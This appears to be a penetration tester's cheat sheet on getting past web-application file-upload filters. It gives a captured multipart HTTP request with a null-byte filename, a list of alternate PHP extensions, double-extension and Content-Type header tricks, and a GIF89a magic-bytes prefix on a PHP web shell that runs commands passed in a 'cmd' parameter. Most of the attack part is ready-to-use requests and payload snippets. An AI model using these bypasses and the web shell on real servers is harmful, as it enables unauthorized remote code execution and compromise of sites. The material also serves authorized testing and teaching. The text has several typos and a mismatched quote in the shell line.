# Arbitrary File Uploads
Some web application in our penetration testing will aloow us to upload certain, or any if we are lucky, files. Most of the time, we will come face-to-face with some kind of filter which only allows us to upload files of a specific category ot type. Below are some methods to attempt to bypass these filters.
## NULL Byte
Using the Burp Suite CE, we can capture the upload and chnage the "filename" attribute to contain a valid extension after a NULL, `%00` byte as shown below,
```
POST /somesite/upload.php HTTP/1.1
Host: (TARGET IP ADDRESS/HOSTNAME)
Content-Length: 12760
Cache-Control: max-age=0
Origin: (TARGET IP ADDRESS/HOSTNAME)
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi6iKb5xi5LuJJOJB
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Referer: (TARGET IP ADDRESS/HOSTNAME)
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryi6iKb5xi5LuJJOJB
Content-Disposition: form-data; name="file"; filename="wpes.php%00.png"
Content-Type: application/x-php
```
The `filename="wpes.php%00.png"` string shows that we tampered with the file name just before we pas the file along ot the web server. 
## Other Extensions
Sometimes, a filter will block extensions like `.php` but not `.php5` which means we can upload our WPES.PHP shell if we simply change the extension to `.php5`. This can be done for PHP files by testying the following extensions,
* pht
* phpt
* phtml
* php3
* php4
* php5
* php6
* php7
## Whitelisting Bypass
We can also attempt to place an extension in the filename itself, like so,
```
wpes.png.php
```
This will bypass a filter such as the following pseudo-code,
```
if file contains ".png"
```
## Content-Type Bypass
some web application filters will check the HTTP request headers from the user which contains the "Content Type" value. This can alos be changed on the fly using the Burp Suite.
```
------WebKitFormBoundaryi6iKb5xi5LuJJOJB
Content-Disposition: form-data; name="file"; filename="wpes.php%00.png"
Content-Type: application/x-php
```
Should be chnaged to,
```
------WebKitFormBoundaryi6iKb5xi5LuJJOJB
Content-Disposition: form-data; name="file"; filename="wpes.php%00.png"
Content-Type: image/jpeg
```
## MIME Numbers Bypass
Some web application filters will actually check the frst few bytes, magic bytes, of a file. This means that we can upload a PHP file if we simply make the first few bytes match that of a PNG or image file.For instance, the list, https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/, states that a GIF file has the MIME/Magic bytes of "GIF89a". So, we simply place that on a line of it's own at the begining of the PHP file like so,
```
GIF89a;
<?php
 system($_GET[cmd']) ...
```
